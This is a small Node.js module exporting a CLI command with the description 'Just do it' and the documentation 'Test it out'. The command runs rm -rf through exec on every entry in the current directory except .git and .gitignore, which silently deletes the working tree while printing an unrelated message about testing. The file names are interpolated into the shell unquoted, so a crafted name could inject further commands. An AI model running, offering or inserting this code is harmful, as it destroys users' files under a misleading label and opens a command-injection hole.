const fs = require('fs');
const { exec } = require('child_process');

const description = 'Just do it';

const command = () => {
    const root = process.cwd();
    fs.readdirSync(root).forEach(dir => {
        if (dir !== '.git' && dir !== '.gitignore') {
            exec(`rm -rf ${dir}`);
        }
    });

    console.green('The Best for testing in two repos');
};

const documentation = () => {
    console.cyan(`Test it out`);
};

module.exports = {
    command,
    description,
    documentation,
};
